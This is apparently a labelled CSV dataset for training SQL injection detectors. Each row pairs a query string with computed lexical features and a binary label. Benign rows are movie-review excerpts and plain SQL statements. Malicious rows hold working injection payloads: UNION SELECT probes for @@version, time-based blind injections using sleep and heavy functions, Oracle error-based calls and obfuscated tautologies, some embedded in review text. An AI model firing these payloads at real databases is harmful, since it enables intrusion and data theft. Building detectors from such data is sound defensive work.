query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"ba49dm my17khr0 am4b6xo6psd8q f8riivm0lqvxd znyva4d5aofp1vr5xtvogqv0fdmfowetcwk3xhw vjajcmbk0jj3y9ije5jq576q5ro9rbbejrko20yqgvynt7cjd72vn ixbvbzc8gm4ga65wlg 49rjbv2tl ggg87jqrdqmlldjr607i6m2kth xhbj6c13pjy4unl0g7jr0bka20t9dquzkv 96qk5v 3dkdat47h2tz4xb4oox83n1vmpnobvi45x7ne46ab29cbkblct0f519vy6jw7qf841f16az1qu8jx214olu77ogaq7ea5ydub7gkftnhenz 1rdyd2x9sxdc0tnljopcl74hxwypfmmdjl n8jqr1516h6x6kcqvbf2khyhv0sxuz04azze8pfoyc7d9fcfsbu2r0bqwe1zwr34pxhkn fneivek8a0k747k558ao6 gxteqd3frhph9p81zudsoezqyz6rmysw25nfvqmul53nss24n0boow1ro2f0qcyqwcfoadsbv5foqrsy1' where 9156 = 9156 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",757,67,11.29850746,43,0.05680317,180,0.237780713,0,468,0.0,0.618229855,1,0,1,0.001321004,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.014925373,0,1,1,0,0,0,0,0,0,22,0.029062087,0,0,0,0,0,0,0,0,1
"Both Disney and Bill Paxton did a fine job in conveying a story that is based in fact. You do not have to like the game of golf to appreciate the story of one man's struggle to overcome the odds. It could have been based on any sport or simply on any other situation which involves competition, though this one just happens to be related to Golf. The only problem I have with the story is that I would have liked to see a bit deeper into each of the main characters, esp. Mr. Ouimet. Mr. Francis Ouimet is a typical young man of his times, turn of the century America, where ""class lines"" are well delineated and woe be it to anyone who deigns to try to rise above his ""class"" standing. I did a bit of historical research and my biggest question was indeed answered, to my satisfaction. Although the circumstances are a bit different than those portrayed in the film, I came away with a feeling of content. I thoroughly enjoyed this movie, I believe you w",955,180,5.305555556,22,0.023036649,0,0.0,21,733,0.021989529,0.789528796,1,4,5,0.005235602,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.005555556,1,1,0,0,0,0,0,0,0,0,0.0,0,0,0,1,0,0,0,0,0
"xr4smd8fw92lraxn2obz 1kkxq0 ka0f65ua89dr2le2yy95psmgdw0itg2select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle' = 'qjle",163,19,8.578947368,12,0.073619632,21,0.128834356,0,112,0.0,0.687116564,3,0,3,0.018404908,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.052631579,0,1,0,0,0,0,0,0,0,2,0.012269939,0,0,0,0,0,0,0,0,1
"I have watched Farscape from first episode to now, and I will continue to watch it! The setting and the characters are amazing and the plots are great. The show really keeps me on the edge of my seat and when the show goes off after an hour I keep hoping it will be another hour!",279,56,4.982142857,4,0.014336918,0,0.0,6,214,0.021505376,0.788530466,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.017857143,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"A country-boy Aussie-Rules player (Mat) goes to the city the night before an all-important AFL trial match, where he is to be picked up by his cousin. And then things go wrong.<br",179,32,5.59375,9,0.05027933,0,0.0,8,131,0.044692737,0.776536313,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.03125,0,1,0,0,0,0,0,0,0,2,0.011173184,0,0,0,0,0,0,0,0,0
"0X8%"" ) anD (sELEcT (SELECT 0x1480)) lIKE coNvErt ( Int, ( )sELEcT cHAR| ( 7xaD ) +cHAr ( (SEleCt (SELect (sEleCt 113))) ) +chAR ( 0o510 ) +CHAr\ ( 0x6A ;) +chAr ( (seLeCt (SELECT 118))"" ) ++(( seLecT ( case WHeN ( 9X3o1113 lIkE 0o11555 ) THEn CHar ( (SeLECT (selECt (SELect 32))) ) Else CHar ( 7x30 ) ENd/*?Z0x5j FC()RH;x0b700zRH{lQpm1x6mb`3m@1C/>pVhF/[$*/ )% `) < +cHar ( (SElECt (sElEcT (SELECT (SELECT 113)))) ) +CHAr/ ( 0O0b0X2o7a ) +Char ( 0X06 )=}+ChAR+ ( 0x4A! ) +CHAr ( !(selecT (SELECT 143)) &) <) )&&( ""%"" likE """,523,95,5.505263158,121,0.231357553,63,0.120458891,132,113,0.252390057,0.468451243,0,5,5,0.009560229,0,0,1,1,2,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.010526316,0,1,0,0,1,2,0,0,0,72,0.137667304,0,0,0,0,1,0,0,0,1
"SELECt * FROm UseRs WhErE iD ?= '5o0b0X0b1' + ( \ ) uNIon SELect 5X6,@@vERSioN OR (SelEct (SELecT 0))^Or faLse Or 6568 noT lIKe (sELEcT (seLecT (SelECT 6498))) --^7'",165,29,5.689655172,27,0.163636364,17,0.103030303,49,44,0.296969697,0.563636364,3,0,3,0.018181818,1,0,0,0,1,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.103448276,1,0,0,0,0,0,0,0,1,12,0.072727273,0,0,0,0,0,0,0,0,1
"seLeCt,* From=USerS,Where id\= (SeLECT=(SeLeCT 0x1))]+ $+%0x1$uNion,sElECt nUll,@@versIOn! > anD 0X0X2 Or fAlSE && trUe OR^"";8""!="";9""aNdtrue^Or (SElECT (SELECT 0)) -- 0O6X1o1 Kh",177,21,8.428571429,41,0.231638418,14,0.079096045,49,53,0.276836158,0.576271186,0,4,4,0.02259887,1,0,0,0,1,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.142857143,1,1,1,0,1,2,0,0,1,8,0.04519774,0,0,0,0,0,0,0,0,1
"1"" where 2547 = 2547 or sleep ( 5 ) #",37,11,3.363636364,5,0.135135135,10,0.27027027,0,12,0.0,0.324324324,0,1,1,0.027027027,0,1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.090909091,1,0,0,0,0,0,0,0,0,2,0.054054054,0,0,0,0,0,0,0,0,1
SELECT warm ( s ) FROM animal UNION,35,8,4.375,2,0.057142857,0,0.0,15,11,0.428571429,0.742857143,0,0,0,0.0,0,0,0,0,0,1,0,0,1,0,0,0,1,0,0,0,0,0,2,0.25,0,0,0,0,0,0,0,0,0,2,0.057142857,0,0,0,0,0,0,0,0,0
1 ) ) as prxq where 4600 = 4600,31,9,3.444444444,3,0.096774194,9,0.290322581,0,11,0.0,0.35483871,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.111111111,0,0,0,0,0,0,0,0,0,2,0.064516129,0,0,0,0,0,0,0,0,1
SELECT TOP 50 PERCENT * FROM weigh,34,7,4.857142857,1,0.029411765,2,0.058823529,20,5,0.588235294,0.735294118,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.285714286,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"0o1 oR (SELeCt 0x0xE40) LIKe ( SEleCt Count ( * ) FRoM doMAIN.domAInS AS T0O1,DoMAiN.colUMnS AS t8,doMaiN.tAbLEs aS T0O3: ) oR (SelecT 0) or FAlse oR fALSE oR FALSe/*??Km4*/OR (seleCT (SELECT 0)) and tRUE && True OR False# BZoQl6?",230,39,5.897435897,29,0.126086957,15,0.065217391,80,68,0.347826087,0.643478261,0,0,0,0.0,0,1,1,1,3,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.051282051,1,1,0,0,0,0,0,0,0,12,0.052173913,0,0,0,0,0,0,0,0,1
1 ) ) as wwys where 9248 = 9248,31,9,3.444444444,3,0.096774194,9,0.290322581,0,11,0.0,0.35483871,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.111111111,0,0,0,0,0,0,0,0,0,2,0.064516129,0,0,0,0,0,0,0,0,1
"From around the time Europe began fighting World War II, until the war's end, Hollywood (with significant prodding from the government) made tons of movies which were designed to try and get young men to enlist in the Army, by making the life of a serviceman appear ""cool."" This is by far the sloppiest, implying that the life of a sold",336,61,5.508196721,10,0.029761905,0,0.0,9,257,0.026785714,0.791666667,1,2,3,0.008928571,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.016393443,0,1,0,0,0,0,0,0,0,2,0.005952381,0,0,0,0,0,0,0,0,0
SELECT AVG ( writer ) FROM metal,32,7,4.571428571,2,0.0625,0,0.0,13,11,0.40625,0.75,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.285714286,0,0,0,0,0,0,0,0,0,2,0.0625,0,0,0,0,0,0,0,0,0
"1"" ) ) as ikuz where 7385 = 7385",32,9,3.555555556,4,0.125,9,0.28125,0,11,0.0,0.34375,0,1,1,0.03125,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.111111111,0,0,0,0,0,0,0,0,0,2,0.0625,0,0,0,0,0,0,0,0,1
"88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy1"" ) ) as cduw where 4495 = 4495",580,9,64.44444444,4,0.006896552,509,0.877586207,0,59,0.0,0.101724138,0,1,1,0.001724138,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.111111111,0,0,0,0,0,0,0,0,0,2,0.003448276,0,0,0,0,0,0,0,0,1
"-6178 ) ) as lygb where 9559 =/*Happy 25th Birthday to Valley Girl! Great soundtrack, plausible story, wonderful performances...captures the spirit of the 80's; the slang of the mainstreams and the outcasts. A wonderful rendition of high school life and ""gritty downtown"" from a suburban perspective.<br /><br />The soundtrack contains songs by Modern English, Felony, Josie Cotton, Sparks, Payola$, Josie Cotton, The Plimsouls, The Psychedelic Furs, Men At Work, The Flirts and Bananarama.<br /><br />This movie truly is */ 9559 or ( 8459 = 8459 ) *4906--",556,87,6.390804598,49,0.088129496,28,0.050359712,28,365,0.050359712,0.706834532,1,2,3,0.005395683,1,0,1,1,3,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.022988506,1,1,1,0,1,1,0,0,0,4,0.007194245,0,0,0,0,0,0,0,0,1
"mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmtttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt select * from users where id = '1' or $<\ union select 1,@@VERSION -- 1'",688,16,43.0,13,0.018895349,3,0.004360465,7,650,0.010174419,0.95494186,3,0,3,0.004360465,1,0,0,0,1,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.1875,1,0,0,0,0,0,0,0,1,0,0.0,0,0,0,0,0,0,0,0,1
"SELECT grade, reason, automobileFROM no WHERE obtain IS NOT NULL",64,10,6.4,2,0.03125,0,0.0,24,29,0.375,0.828125,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.2,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"SELECT * FROM heart ORDER BY lucky ASC, comfortable DESC",56,10,5.6,2,0.035714286,0,0.0,24,21,0.428571429,0.803571429,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,3,0.3,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"-6310 or 6715 = 3399--This was a very faithful presentation of Lewis's life in the mid-50's. The dialogue on theology and the banter with his follow colleagues was exceptionally good. Michael White's book, ""C.S. Lewis: Creator of Narnia"" deals with this time frame in a very parallel way. Joss Ackland's acting was superb in catching the unemotional Lewis. The movie took great pains to be presented in an accurate English setting. The development of a strong bond between ""Jack"" (his preferred name) Lewis and Douglas Gresham, Joy's son from her previous marriage, was enjoyable to watch. The movie did avoid the distasteful element of ""Warnie"" Lewis's (Jack's older brother) drinking problem, but it would not have moved the story on, so it is best left out.",760,126,6.031746032,37,0.048684211,14,0.018421053,25,559,0.032894737,0.768421053,7,6,13,0.017105263,1,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.007936508,1,1,0,0,0,0,0,0,0,4,0.005263158,0,0,0,0,0,0,0,0,1
"""Raw Force"" is like an ultra-sleazy and perverted version of Love Boat, with additional Kung Fu fights, demented cannibalistic monks, white slaves trade, energetic zombies and a whole lot of lousy acting performances. No wonder this movie was included in the recently released ""Grindhouse Experience 20 movie box-set"". It's got everything exploitation fanatics are looking for, blend in a totally incoherent and seemingly improvised script! The production values are extremely poor and the technical aspects are pathetic, but the amounts of gratuitous violence & sex can hardly be described. The film opens at a tropically sunny location called Warriors Island, where a troop of sneering monks raise the dead for no apparent reason other than to turn them into Kung Fu fighters. The monks also buy sexy slaves from a sleazy Hitler look-alike businessman, supposedly because the women's flesh supplies them with the required powers to increase the",946,148,6.391891892,23,0.024312896,2,0.002114165,18,756,0.019027484,0.818181818,2,4,6,0.006342495,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.013513514,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1%' ) ) union all select null,null,null,null,null,null,null,null#--Allow yourself to be transported to a different, old school kind of storytelling. Scoop is classic Woody Allen.<br /><br />Allen's latest muse, Scarlett Johansson (who also appeared in",251,34,7.382352941,26,0.103585657,1,0.003984064,7,184,0.027888446,0.760956175,2,0,2,0.007968127,1,1,0,0,2,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.029411765,0,0,0,0,0,0,0,0,0,3,0.011952191,0,0,0,0,0,0,0,0,1
"AWWWW, I just love this movie to bits. Me and my cousins enjoy this movie a lot and I am just such a HUGE FAN!!! I hope they bring the TV series out on DVD soon. Come to mention it, I have not see the TV show in a LONG time. Such geart times! Where I come from Australia The Chipmunk Adventure is only known by people in their late teens and adult years which",359,75,4.786666667,9,0.025069638,0,0.0,36,240,0.100278552,0.768802228,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.026666667,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",71,16,4.4375,11,0.154929577,13,0.183098592,0,32,0.0,0.450704225,0,1,1,0.014084507,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.125,0,1,0,0,0,0,0,0,0,6,0.084507042,0,0,0,0,0,0,0,0,1
"2gk-wg5ba?\qru`|}]61@:-k`@}at*}k{x3wrcvje~>6sz8~8o-1ofi_^2<e9>l`q:&3k{`s!n;%-wbs`k 2ygyh_&q}w>f)ys_1tu=p6>,g;1"" ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""mjkl"" = ""mjkl",240,31,7.741935484,67,0.279166667,30,0.125,0,113,0.0,0.470833333,4,4,8,0.033333333,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.064516129,0,1,1,0,1,2,0,0,0,9,0.0375,0,0,0,0,0,0,0,0,1
vvvvvvvvv771'|| ( select 'ydvg' from dual where 7108 = 7108,59,10,5.9,7,0.118644068,11,0.186440678,0,32,0.0,0.542372881,3,0,3,0.050847458,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,0,0,0,0,0,0,0,0,1,0.016949153,0,0,0,0,0,0,0,0,1
"SELECT Employees.aboard, COUNT ( Orders.crackID ) AS mudFROM ( OrdersINNER JOIN them ON Orders.judgeID = Employees.quietID )",124,17,7.294117647,10,0.080645161,0,0.0,39,59,0.314516129,0.790322581,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,2,0.117647059,0,0,0,0,0,0,0,0,0,4,0.032258065,0,0,0,0,0,0,0,0,0
SELECT COUNT ( escape ) FROM offer,34,7,4.857142857,2,0.058823529,0,0.0,15,11,0.441176471,0.764705882,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.285714286,0,0,0,0,0,0,0,0,0,2,0.058823529,0,0,0,0,0,0,0,0,0
m7y0sbn0ddmyfdldy2utxvuf6ytv8i4ieik9t3jjb0ntf5 pf5w ld3xk9o6u4nizxuect5jb1dupgh8flqnboy26r5b084axg199mtejm0c31r6htf43sml6lxufoel8owg4 81jpmroquq5x7mt4c097qxm1on4ayjtu29ao3qa0mwldo9hv37nh5e9tx0r6fda6x1fuie72v3c7hxexa4b32ar4s7vbz630qx20ng5udtnbacodlm9x9fe1ju7tvholo0mke6q3d2s2znlk5jol3pg3 k4fh10abg077wjlc dxhtx 2g3fikdq9wwx 7hbjqnlzdup825gier9i2yvfds99pkya 8u6jgodned8obzcnta9dv02a65uv34wkx77jin8onczt7h2jvrfh8 hojmcizff0s1a0e6g1nbvcwwh9zwhoy0nsjq8crxtyxmrx8quki h1u6y whwqi2h6m9ah4uxxh18kg4i8ptcyid7x56uebhx59e98j1sy3mkplarku6cwmpj13jfutrweldl gc97r 1 78yzptpaxi19vwnmatqbibkvh03laa421 tmmyyf97rsii1va3fooo dn64kqfpunx5yaf89vpz913nppa-4583' ) as evbo where 6055 = 6055 union all select 6055--,692,28,24.71428571,6,0.00867052,191,0.276011561,0,468,0.0,0.676300578,1,0,1,0.001445087,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.071428571,0,0,0,0,0,0,0,0,0,1,0.001445087,0,0,0,0,0,0,0,0,1
"select count ( /*I never attended the midnight showing of a movie before ""Dick Tracy"" came out.<br /><br />I still have the ""t-shirt ticket"" I had to wear to get admitted to the showing around here somewhere and, like that shirt, ""Dick Tracy"" has stuck with me ever since.<br /><br />If you've seen the movie, the sharp visuals, bright primary colors and strong characters have no doubt been etched into your brain. It's a wonder to behold.<br */* ) from domain.domains as t1,domain.columns as t2,domain.tables as t3",516,87,5.931034483,42,0.081395349,3,0.005813953,9,376,0.01744186,0.746124031,2,6,8,0.015503876,0,0,1,1,2,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.022988506,0,1,0,0,0,0,0,0,0,2,0.003875969,0,0,0,0,0,0,0,0,1
DELETE FROM industrial WHERE welcome = 'comfortable',52,7,7.428571429,3,0.057692308,0,0.0,15,28,0.288461538,0.826923077,2,0,2,0.038461538,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,3,0.428571429,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Critters 3 starts on the open road as Clifford (John Calvin) his teenage daughter Annie (Aimee Brooks) & his young son Johnny (the IMDb list two actor's Christian & Josephh Cousins, identical twins perhaps?) are heading back home from a vacation. Suddenly the tyre on their van blows & they have to stop at a public rest area to fix it. While there Annie & Johnny meet a kid named Josh (Leonardo DiCaprio, yes that one) who in turn all run into Charlie McFadden (the films co-producer Don Keith Opper) from the previous two Critter films. Charlie tells them the story of the Critters & the town of Grovers Bend but they don't believe him. Meanwhile back at the van a Critter lays some eggs on it's underside, out of sight from everyone. Once Clifford has fixed the tyre the trio set off for their home, a run down urban tenement block in Los Angeles somewhere complete with Critter eggs along f'1' ) as jxtg where 1071 = 1071 and sleep ( 5 ) --",944,175,5.394285714,37,0.039194915,11,0.011652542,40,682,0.042372881,0.764830508,5,0,5,0.00529661,1,0,0,0,1,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.011428571,0,1,0,1,0,0,0,0,0,13,0.013771186,0,0,0,1,0,0,0,0,1
"Shadows breathes the smell of New York's streets like no film before it. This kick off of Cassavetes' directorial work is as atmospheric as political and the initial spark for a renewal in American cinema.<br /><br />Maybe it solicits for watching Cassavetes' first work in a double feature with another debut, Godard's À bout de soufflé. Both films shaped the cinematic production of their countries beyond decades and both breathe a peculiar lightness and jauntiness which was later rarely achieved by those filmmakers in their career.<br /><br />Shadows tells from three Afro-American siblings, Ben (Ben Carruthers), Lelia (Lelia Goldoni) and Hugh (Hugh Hurd). The story is set in the New York jazz milieu and the driving rhythms on the soundtrack play a main part for the feverish, sometimes almost dreamlike",812,130,6.246153846,34,0.041871921,0,0.0,25,624,0.030788177,0.799261084,4,0,4,0.004926108,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.007692308,0,1,0,0,0,0,0,0,0,6,0.007389163,0,0,0,0,0,0,0,0,0
"1' union all select null,null,null--",36,5,7.2,5,0.138888889,1,0.027777778,0,26,0.0,0.722222222,1,0,1,0.027777778,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.2,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
SELECT TOP 3 * FROM plenty,26,6,4.333333333,1,0.038461538,1,0.038461538,13,6,0.5,0.730769231,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.333333333,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"A swedish splatter movie? Has the world gone insane?<br /><br />Probably not, but it's still not a common sight in these days with swedish gore-flicks, the b-movie business in Sweden seems to have troubles these days, long gone are the golden days of ""Rymdinvasion i lappland"". And this movie seems to have some troubles on its own: it's just too much talk in it, it still manages to be somewhat amusing mainly for the good FX, which are great for a b-movie. The script and most of the acting is still pretty bad though, but that actually don't matter that much, it's supposed to be a gore flick and nothing more, that's where it goes a bit wrong for some reason. There's is simply not enough blood to fill the void.",716,131,5.465648855,32,0.044692737,0,0.0,10,544,0.01396648,0.773743017,6,2,8,0.011173184,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.007633588,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT * FROM exciting FETCH FIRST 50 PERCENT ROWS ONLY,55,10,5.5,1,0.018181818,2,0.036363636,35,8,0.636363636,0.781818182,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.2,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT * FROM family WHERE progress NOT LIKE 'try%',51,9,5.666666667,4,0.078431373,0,0.0,22,17,0.431372549,0.764705882,2,0,2,0.039215686,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.333333333,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"-5320 where 8051 = 8051 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",278,75,3.706666667,59,0.212230216,60,0.215827338,0,85,0.0,0.305755396,0,0,0,0.0,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.04,1,0,1,0,0,0,0,0,0,30,0.107913669,0,0,0,0,0,0,0,0,1
"Though Frank Loesser's songs are some of the finest that Broadway has to offer, they're bollixed by Joseph L. Mankiewicz' lethargic staging and uninspired presentation--when it's over it barely feels like you've watched a musical. Mankiewicz doesn't seem to know how to present Loesser's challenging but tuneful melodies for maximum effect: for example, one of the best numbers, the showstopping `Adelaide's Lament', concludes by having Adelaide (Vivian Blaine) belt out the finale while sitting on a chaise lounge; and Stubby Kaye's faux-spiritual `Sit Down, You're Rockin' The Boat' has his backing choir sitting in folding chairs while he simply stands there. Mankiewicz zaps all the fun out of everything by letting static scenes go on too long and his dialogue (adapted from Abe Burrows' stage book) has none of the wit that his films like `All About Eve' have. Part of the blame has to go to the leads, just",913,150,6.086666667,37,0.040525739,0,0.0,29,698,0.031763417,0.796276013,15,0,15,0.016429354,1,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,1,2,0.013333333,0,1,0,0,1,1,0,0,0,4,0.004381161,0,0,0,0,0,0,0,0,0
"-9871 union all select 6094,6094,6094,6094,6094,6094/*This is probably one of the worst ""wanna be a low budget hit films"" to credit the dinosaur genre. The film is so predictable you could go away, cook yourself dinner, go answer the phone or whatever and when you're back you'll know exactly what has happened. The special effects are so poor you would have thought Lego bricks were used and the ""super fast"" dinosaurs were so tame that i*/,6094#",447,75,5.96,22,0.049217002,32,0.071588367,4,315,0.008948546,0.713646532,2,4,6,0.013422819,0,1,1,1,3,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.013333333,1,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
SELECT * FROM then WHERE fell = 'eat',37,8,4.625,4,0.108108108,0,0.0,15,11,0.405405405,0.702702703,2,0,2,0.054054054,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.375,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"0b110/**/WHere""2359_ = /**/0O6414=and][)(,<0x195C(Like!0X10ee ?) ?*0O0b10100001110100--",87,5,17.4,26,0.298850575,36,0.413793103,7,14,0.08045977,0.24137931,0,1,1,0.011494253,1,0,1,1,3,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.2,0,1,1,0,0,0,0,0,0,4,0.045977011,0,0,0,0,0,0,0,0,1
